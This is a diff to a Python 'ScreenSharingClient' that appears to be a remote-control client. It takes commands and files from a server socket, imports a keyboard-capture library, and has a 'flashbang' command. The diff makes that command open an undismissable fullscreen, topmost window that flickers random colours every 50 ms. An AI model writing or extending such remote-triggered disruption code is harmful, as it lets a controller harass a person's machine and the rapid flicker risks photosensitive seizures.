@@ -12,6 +12,7 @@ import subprocess
 from pynput import keyboard
 import asyncio
 import base64
+import random
 
 
 class ScreenSharingClient:
@@ -19,7 +20,7 @@ class ScreenSharingClient:
     # The Client Brain LOL
     # All you need to know is... this works
     # ------------------------------------------------
-    def __init__(self, server_ip="0.0.0.0", port=5001):
+    def __init__(self, server_ip="localhost", port=5001):
         self.server_ip = server_ip
         self.port = port
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -42,6 +43,8 @@ class ScreenSharingClient:
     def receive_data(self):
         try:
             while True:
+                # File Communication Handler
+                # --------------------------------------------------------------------------------------------------------------------------------
                 header = self.socket.recv(4)
                 if header == b"FILE":
                     tag = self.socket.recv(5).decode("utf-8")
@@ -112,6 +115,8 @@ class ScreenSharingClient:
                         else:
                             self.socket.sendall("F".encode("utf-8"))
                             self.socket.sendall("fileDolocation".encode("utf-8"))
+                # --------------------------------------------------------------------------------------------------------------------------------
+                # Normal Commands:
                 command = self.socket.recv(1024).decode("utf-8")
                 if command.lower() == "flashbang":
                     try:
@@ -202,31 +207,36 @@ class ScreenSharingClient:
             error_message = f"Error: {e}"
             return error_message
 
+    # Code by some guy on stackoverflow
+    def randomColor(self):
+        return "#" + "".join([random.choice("0123456789ABCDEF") for c in range(6)])
+
     def trigger_flashbang(self):
         if hasattr(self, "error_box") and self.error_box.winfo_exists():
             return
 
         self.error_box = tk.Tk()
-        black = "#ff0000"
-        white = "#ffffff"
-        self.error_box.configure(bg=black)
+        randomColor1 = self.randomColor()
+        randomColor2 = self.randomColor()
+        self.error_box.configure(bg=randomColor1)
         self.error_box.attributes("-topmost", True)
         self.error_box.attributes("-fullscreen", True)
         self.error_box.overrideredirect(True)
         self.error_box.resizable(False, False)
 
-        def swap_colors():
+        def colorFlicker():
             try:
                 if not self.error_box.winfo_exists():
                     return
-                nonlocal black, white
-                black, white = white, black
-                self.error_box.configure(bg=black)
-                self.error_box.after(50, swap_colors)
+                nonlocal randomColor1, randomColor2
+                randomColor1 = self.randomColor()
+                randomColor2 = self.randomColor()
+                self.error_box.configure(bg=randomColor1)
+                self.error_box.after(50, colorFlicker)
             except Exception:
                 return
 
-        swap_colors()
+        colorFlicker()
         self.error_box.mainloop()
 
     def stop_screen_share(self):
